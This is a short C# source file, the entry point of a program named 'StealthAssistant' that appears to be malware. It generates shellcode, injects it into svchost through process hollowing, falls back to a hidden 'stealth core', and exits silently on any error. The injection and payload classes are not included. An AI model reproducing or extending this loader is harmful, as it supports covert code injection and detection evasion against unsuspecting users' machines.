using System;
using System.Threading;
using System.Windows.Forms;

namespace StealthAssistant.ProcessHollow
{
    internal class Program
    {
        [STAThread]
        static void Main()
        {
            try
            {
                // Enable visual styles
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                
                // Try process hollowing first
                byte[] payload = ProcessHollowingCore.GenerateStealthAssistantShellcode();
                bool success = ProcessHollowingCore.InjectIntoSvchost(payload);
                
                if (!success)
                {
                    // Fallback to simplified stealth assistant
                    var core = new SimpleStealthCore();
                    core.Start();
                    
                    // Run message loop
                    Application.Run();
                }
                else
                {
                    // Process hollowing succeeded - this process can exit
                    Environment.Exit(0);
                }
            }
            catch
            {
                // Silent exit on any error
                Environment.Exit(0);
            }
        }
    }
}